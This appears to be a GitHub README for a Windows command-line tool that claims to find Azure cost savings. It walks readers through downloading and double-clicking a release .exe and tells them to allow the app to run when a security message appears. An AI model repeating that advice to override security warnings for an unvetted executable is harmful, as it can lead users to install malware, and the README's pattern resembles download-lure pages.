# ⚙️ azure-cost-optimizer - Find Savings in Azure Cloud Use

[![Download azure-cost-optimizer](https://img.shields.io/badge/Download-azure--cost--optimizer-brightgreen?style=for-the-badge)](https://github.com/weedgu/azure-cost-optimizer)

---

## 📋 What is azure-cost-optimizer?

azure-cost-optimizer is a command line tool that helps you find ways to reduce spending on Microsoft Azure cloud services. The tool looks at your Azure resources and shows where you can save money. It gives clear advice on what to change or stop using to lower your bills.

This tool is for anyone who uses Microsoft Azure and wants to manage costs better without digging deep into technical details. It is easy to run and does not require programming experience.

---

## 🔎 Key Features

- Scans your Azure environment for resource usage.
- Finds unused or underused resources.
- Suggests actions to reduce costs, like resizing or deleting resources.
- Summarizes potential savings in an easy-to-understand format.
- Works directly from your Windows computer.
- Runs in a simple command prompt window.
- Provides output that you can save or share.

---

## 💻 System Requirements

To use azure-cost-optimizer on Windows, your computer needs:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- 200 MB of free disk space
- Internet connection to access Azure and download updates
- PowerShell or Command Prompt access

No programming or specialist knowledge is needed.

---

## 🚀 Getting Started: Download and Run on Windows

You can get the tool from the main GitHub page here:

[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/weedgu/azure-cost-optimizer)

### Step 1: Visit the download page

Go to the GitHub page above. This page holds the latest version of the tool and all the files you need.

### Step 2: Find the latest release

Once on the page:

- Look for the "Releases" section on the right side or in the repository menu.
- Click on the latest release version to open the release details.

### Step 3: Download the Windows version

- Find the file that ends with `.exe` or has `windows` in the name.
- Click the file to download it to your computer.
- Save it in a folder you can easily find, like your Desktop or Downloads folder.

### Step 4: Run the installer or executable

- Double-click the downloaded file.
- Follow any on-screen instructions to install or open the program.
- If a security message appears, allow the app to run.

---

## 🔧 How to Use azure-cost-optimizer on Windows

### Open Command Prompt

1. Click Start or press the Windows key.
2. Type `cmd`.
3. Press Enter to open the Command Prompt window.

### Navigate to the tool folder

Use the command prompt to go to the folder where you saved the tool. For example, if it is on your Desktop, type:

```
cd %USERPROFILE%\Desktop
```

Then press Enter.

### Run the tool

Type the command:

```
azure-cost-optimizer.exe analyze
```

Then press Enter.

This starts the scan of your Azure resources.

### View the results

The tool will show a list of all resources, highlight where you can save money, and offer suggestions on what to change or remove.

You can save the report by adding this at the end of the command:

```
> report.txt
```

For example:

```
azure-cost-optimizer.exe analyze > report.txt
```

The file `report.txt` will be saved in the same folder.

---

## 🔒 Connecting azure-cost-optimizer to Your Azure Account

Before running the tool, you need to connect it to your Azure account.

### Step 1: Sign in to Azure

1. Open PowerShell or Command Prompt.
2. Type:

```
az login
```

and press Enter.

3. Your browser will open, asking you to sign in with your Microsoft Azure credentials.

If you do not have the Azure CLI installed, download it here:

[https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-windows](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-windows)

### Step 2: Grant necessary permissions

Make sure your Azure user has read access to the subscription you want to analyze. The tool needs permission to view resource details.

---

## 🛠 Troubleshooting Tips

- If you get a "command not found" error, check that your Command Prompt is pointed to the folder where you saved the tool.
- Make sure you signed in successfully with `az login`.
- Verify your internet connection is active.
- If the tool does not start, try running Command Prompt as Administrator.
- Check that your Windows version matches the system requirements.

---

## 🔄 Updating the Tool

To keep the tool working well, check the GitHub page regularly for new versions.

1. Visit the download page:
   
   [https://github.com/weedgu/azure-cost-optimizer](https://github.com/weedgu/azure-cost-optimizer)

2. Download the latest `.exe` or update files.
3. Replace your old files with the new ones.

---

## 🤝 Getting Help and Support

You can use the GitHub repository to:

- Report problems or bugs.
- Ask questions.
- Suggest improvements.

Use the "Issues" tab on the GitHub page to submit feedback.

---

## 🔍 About This Tool

The azure-cost-optimizer focuses on cloud cost management for Azure users. It helps identify inefficiencies in how your resources are used and points out where you can save money. Whether you run a small business or manage a large system, this tool helps keep your cloud spending under control without needing technical skills.

---

## 🔖 Topics

- Azure
- Azure Advisor
- Cloud cost management
- Cost optimization
- DevOps support
- FinOps
- Python CLI tools
- Resource analysis

---

[Download azure-cost-optimizer now](https://github.com/weedgu/azure-cost-optimizer) to get started managing your Azure costs.